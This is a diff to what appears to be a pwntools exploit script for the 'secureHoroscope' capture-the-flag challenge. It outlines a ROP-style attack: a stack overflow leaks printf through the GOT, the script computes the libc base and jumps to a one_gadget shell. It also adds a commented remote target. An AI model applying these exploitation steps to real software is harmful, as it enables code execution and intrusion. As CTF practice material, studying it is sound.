@@ -2,7 +2,7 @@
 Idea:
 1) Leak printf() by changing RBP to point to the PLT/GOT using stack overflow in getInfo()
 2) Calculate libc base address by using static offset
-3) Use one_gadget Ruby tool to find libc gadget
+3) Use one_gadget Ruby tool to find libc gadget (NOTE: make sure you use this on Ubuntu 18.04)
 4) Calculate that gadget's actual address with found libc base
 5) Execute that gadget by overwriting stack return address
 """
@@ -12,6 +12,7 @@ from pwn import *
 elf = context.binary = ELF('./secureHoroscope')
 
 io = process()
+# io = remote('sechoroscope.sdc.tf', 1337)
 io.recvuntil(b'To get started, tell us how you feel\n')
 io.sendline(b'')
 io.recvuntil(b"we will have your very own horoscope\n\n")
